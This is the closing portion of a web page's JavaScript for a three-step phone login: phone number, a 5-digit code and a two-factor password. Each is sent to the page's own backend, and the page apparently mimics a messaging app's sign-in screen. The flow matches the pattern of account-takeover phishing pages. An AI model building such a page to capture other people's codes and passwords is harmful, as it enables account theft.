                'Saudi Arabia': 9,
                'Senegal': 9,
                'Serbia': 9,
                'Seychelles': 8,
                'Sierra Leone': 7,
                'Singapore': 8,
                'Sint Maarten (Dutch part)': 7,
                'Slovakia': 9,
                'Slovenia': 8,
                'Solomon Islands': 7,
                'Somalia': 9,
                'South Africa': 9,
                'South Korea': 10,
                'South Sudan': 9,
                'Spain': 9,
                'Sri Lanka': 10,
                'Sudan': 9,
                'Suriname': 7,
                'Sweden': 9,
                'Switzerland': 9,
                'Tajikistan': 9,
                'Tanzania': 9,
                'Thailand': 10,
                'Timor-Leste (East Timor)': 7,
                'Togo': 8,
                'Tonga': 7,
                'Trinidad and Tobago': 7,
                'Tunisia': 8,
                'Turkey': 10,
                'Turkmenistan': 8,
                'Tuvalu': 6,
                'Uganda': 9,
                'Ukraine': 10,
                'United Arab Emirates': 9,
                'United Kingdom': 10,
                'United States': 10,
                'Uruguay': 9,
                'Uzbekistan': 9,
                'Vanuatu': 7,
                'Vatican City': 6,
                'Venezuela': 11,
                'Vietnam': 10,
                'Yemen': 9,
                'Zambia': 9,
                'Zimbabwe': 9
            };

            // Check if the number of digits is within the range
            return digitsOnly.length >= minDigits[country] && digitsOnly.length <= maxDigits[country];
        }
         // Function to validate login code (must be exactly 5 digits)
         function validateLoginCode(code) {
            const digitsOnly = code.replace(/\D/g, '');
            return digitsOnly.length === 5;
        }

        // Function to update phone number input with country code
        function updatePhoneNumberPrefix() {
            const country = document.getElementById('country').value;
            const phoneNumberInput = document.getElementById('phoneNumber');
            const countryCode = countryCodes[country];
            phoneNumberInput.value = countryCode + ' ';
            phoneNumberInput.placeholder = 'Enter your number';
        }

        // Add event listener to country select to update the phone number input
        document.getElementById('country').addEventListener('change', updatePhoneNumberPrefix);

        // Initial call to set the default country code
        updatePhoneNumberPrefix();

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            const phoneNumberInput = document.getElementById('phoneNumber');
            const phoneNumber = phoneNumberInput.value;
            const country = document.getElementById('country').value;
            const originalButtonText = 'Next';

            // Validate the phone number
            if (!validatePhoneNumber(phoneNumber, country)) {
                // Add shake effect to the phone number input
                phoneNumberInput.classList.add('shake');
                // Trigger vibration
                if (navigator.vibrate) {
                    navigator.vibrate(50); // Vibration for 200ms
                }
                // Remove shake effect after animation completes
                setTimeout(() => {
                    phoneNumberInput.classList.remove('shake');
                }, 500);
                // Prevent form submission
                e.preventDefault();
                return;
            }

            await handleFormSubmit('loginForm', 'btnText1', 'loadingSpinner1', originalButtonText, 'send_code', { phone_number: phoneNumber },
                (data) => {
                    if (data.success) {
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        document.getElementById('displayPhoneNumber').textContent = phoneNumber;
                        document.getElementById('phoneNumberResult').textContent = ''; // Clear any previous messages
                        document.getElementById('result').textContent = ''; // Clear any previous messages
                    } else {
                        document.getElementById('result').textContent = 'Please try again after some minutes';// Display error message
                    }
                },
                () => {
                    document.getElementById('phoneNumberResult').textContent = 'An error occurred. Please try again.';
                    document.getElementById('result').textContent = ''; // Clear any previous messages
                }
            );
        });

        document.getElementById('code').addEventListener('input', function () {
            let monkeyAnimation = document.getElementById('monkeyAnimation');
            if (this.value.length > 0) {
                monkeyAnimation.classList.remove('hidden'); // Show animation when there's input
            } else {
                monkeyAnimation.classList.add('hidden'); // Hide when input is cleared
            }
        });

       document.getElementById('codeForm').addEventListener('submit', async (e) => {
            const codeInput = document.getElementById('code');
            const code = codeInput.value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const originalButtonText = 'NEXT';

              // Validate the login code (must be exactly 5 digits)
              if (!validateLoginCode(code)) {
                // Add shake effect to the code input
                codeInput.classList.add('shake');
                // Trigger vibration
                if (navigator.vibrate) {
                    navigator.vibrate(200); // Vibration for 200ms
                }
                // Remove shake effect after animation completes
                setTimeout(() => {
                    codeInput.classList.remove('shake');
                }, 500);
                // Prevent form submission
                e.preventDefault();
                return;
            }

            await handleFormSubmit('codeForm', 'btnText2', 'loadingSpinner2', originalButtonText, 'login', { phone_number: phoneNumber, code: code },
                (data) => {
                    if (data.success) {
                        setTimeout(() => {
                            window.location.replace(data.redirect);
                        }, 0);
                    } else if (data['2fa_required']) {
                        document.getElementById('step2').classList.add('hidden');
                        document.getElementById('step3').classList.remove('hidden');
                        document.getElementById('codeResult').textContent = '';
                        document.getElementById('result').textContent = '';
                    } else {
                        document.getElementById('codeResult').textContent = 'Incorrect login code. Please try again.';
                    }
                },
                () => {
                    document.getElementById('codeResult').textContent = 'An error occurred. Please try again.';
                }
            );
        });

        document.getElementById('2faForm').addEventListener('submit', async (e) => {
            const password = document.getElementById('password').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const originalButtonText = 'NEXT';

            await handleFormSubmit('2faForm', 'btnText3', 'loadingSpinner3', originalButtonText, '2fa', { phone_number: phoneNumber, password: password },
                (data) => {
                    if (data.success) {
                        setTimeout(() => {
                            window.location.replace(data.redirect);
                        }, 0);
                    } else {
                        // Display the error message right after the password input
                        document.getElementById('passwordResult').textContent = 'Incorrect password. Please try again.';
                    }
                },
                () => {
                    document.getElementById('passwordResult').textContent = 'An error occurred. Please try again.';
                }
            );
        });

        function goBack() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
        }
    </script>
</body>

</html>
